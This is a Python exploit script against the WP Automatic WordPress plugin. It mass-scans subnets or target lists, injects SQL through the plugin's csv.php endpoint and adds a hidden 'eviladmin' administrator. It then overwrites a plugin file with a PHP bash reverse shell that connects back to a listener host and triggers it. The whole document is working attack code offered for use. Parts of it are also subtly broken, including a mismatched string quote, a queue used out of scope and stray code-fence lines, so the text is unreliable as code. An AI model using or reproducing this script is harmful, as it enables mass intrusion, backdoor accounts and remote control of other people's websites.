import requests
import hashlib
import re
import argparse
import threading
import queue
import socket
from ipaddress import ip_network
import time

# Parse command line arguments
parser = argparse.ArgumentParser(description='Exploit WP Automatic plugin vulnerability.')
parser.add_argument('--lhost', default='127.0.0.1', help='The IP address of the listener (default: 127.0.0.1)')
parser.add_argument('--lport', type=int, default=1414, help='The port number of the listener (default: 1414)')
parser.add_argument('--threads', type=int, default=10, help='The number of threads to use (default: 10)')
parser.add_argument('--targets', help='The path to a file containing a list of targets (one per line)')
parser.add_argument('--subnet', help='The subnet to scan (e.g. 192.168.1.0/24)')
args = parser.parse_args()

lhost = args.lhost
lport = args.lport
threads = args.threads
targets_file = args.targets
subnet = args.subnet

# Validate input
if not socket.inet_aton(lhost):
    print('[-] Error: Invalid IP address for listener')
    exit(1)
if lport <= 0 or lport >= 65536:
    print('[-] Error: Invalid port number for listener')
    exit(1)
if threads <= 0:
    print('[-] Error: Invalid number of threads')
    exit(1)
if not targets_file and not subnet:
    print('[-] Error: You must specify either --targets or --subnet')
    exit(1)

# Automatic target scanner
def scan_subnet(subnet):
    for ip in ip_network(subnet).hosts():
        url = f"http://{str(ip)}/wordpress"
        q.put(url)

# Read targets from file
def read_targets(targets_file):
    with open(targets_file, "r") as f:
        for line in f:
            url = line.strip()
            q.put(url)

# Generate dynamic values for exploitation
def get_user_agent():
    # Generate a random User-Agent string
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like
```
Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0",
"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0"
]
    return user_agents[int(hashlib.md5(str(time.time()).encode()).hexdigest(), 16) % len(user_agents)]

def get_integ_hash(query):
    # Generate a dynamic MD5 hash for the 'integ' parameter
    return hashlib.md5(query.encode()).hexdigest()

# Exploit function
def exploit(url):
    try:
        domain = url
        wp_automatic_url = domain + "/wp-content/plugins/wp-automatic/inc/csv.php"
        headers = {
            "User-Agent": get_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        # Check if the WP Automatic plugin is installed
        check_data = {
            "q": "SELECT * FROM `wp_plugins` WHERE `plugin_name` LIKE '%wp-automatic%'",
            "auth": " ",
            "integ": get_integ_hash("SELECT * FROM `wp_plugins` WHERE `plugin_name` LIKE '%wp-automatic%'")
        }
        r = requests.post(wp_automatic_url, headers=headers, data=check_data)
        if "wp-automatic" in r.text:
            print(f"[+] WP Automatic plugin found on {url}")

            # INSERT new user
            user_data = {
                "q": "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')",
                "auth": " ",
                "integ": get_integ_hash("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('eviladmin', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'eviladmin', 'eviladmin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'eviladmin')")
            }
            r = requests.post(wp_automatic_url, headers=headers, data=user_data)

            # Find ID of the user we just inserted
            max_id = 1000
            found = False
            for id in range(0, max_id):
                user_query = "SELECT * FROM `wp_users` WHERE user_login='eviladmin' AND ID=" + str(id)
                integ_hash = get_integ_hash(user_query)
                data = {"q": user_query, "integ": integ_hash}
                response = requests.post(wp_automatic_url, headers=headers, data=data)
                if ",,," in response.text:
                    user_id = str(id)
                    found = True
                    break

            if not found:
                print(f"[-] User ID not found on {url}. Aborting.")
                return

            # Add Role Administrator to the user
            role_data = {
                "q": f"INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ({user_id}, 'wp_capabilities', 'a:1{{s:13:\"administrator\";s:1:\"1\";}}')",
                "auth": " ",
                "integ": get_integ_hash(f"INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ({user_id}, 'wp_capabilities', 'a:1{{s:13:\"administrator\";s:1:\"1\";}}')")
            }
            r = requests.post(wp_automatic_url, headers=headers, data=role_data)

            print(f'[+] Successfully added Administrator account: eviladmin on {url}")

            # Login
            login_url = domain + "/wp-login.php"
            login_data = {
                "log": "eviladmin",
                "pwd": "eviladmin",
                "wp-submit": "Log In",
                "redirect_to": "http://localhost/wordpress/wp-admin/users.php",
                "testcookie": "1"
            }
            session = requests.session()
            session.post(login_url, headers=headers, data=login_data)

            # Upload the shell
            edit_wp_automatic_url = domain + "/wp-admin/plugin-editor.php?plugin=wp-automatic%2Findex.php&Submit=Select"
            r = session.get(edit_wp_automatic_url,
```
headers=headers)
            nonce = re.search(r'<input type="hidden" id="nonce" name="nonce" value="([^"]+)" />', r.text).group(1)

            if nonce:
                upload_url = domain + "/wp-admin/admin-ajax.php"
                payload_data = {
                    "nonce": nonce,
                    "_wp_http_referer": "/wordpress/wp-admin/plugin-editor.php?file=wp-automatic%2Findex.php&plugin=wp-automatic%2Fwp-automatic.php",
                    "newcontent": f"<?php \nexec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");\n?>",
                    "action": "edit-theme-plugin-file",
                    "file": "wp-automatic/index.php",
                    "plugin": "wp-automatic/wp-automatic.php",
                    "docs-list": ''
                }
                r = session.post(upload_url, data=payload_data)

                print(f"[+] Reverse shell is being sent to {url}")
                shell_url = domain + "/wp-content/plugins/wp-automatic/index.php"
                r = requests.get(shell_url, headers=headers)
                print(f"[+] Shell has been executed on {url}")
            else:
                print(f"[-] Nonce not found on {url}. Shell upload failed.")
        else:
            print(f"[-] WP Automatic plugin not found on {url}")
    except Exception as e:
        print(f"[-] Error exploiting {url}: {e}")

# Main function
def main():
    # Start the thread pool
    q = queue.Queue()
    for i in range(threads):
        t = threading.Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()

    # Add targets to the queue
    if targets_file:
        read_targets(targets_file)
    elif subnet:
        scan_subnet(subnet)
    else:
        print("[-] Error: You must specify either --targets or --subnet")
        exit(1)

    # Wait for all targets to be processed
    q.join()

# Worker function
def worker(q):
    while True:
        url = q.get()
        exploit(url)
        q.task_done()

if __name__ == "__main__":
    main()
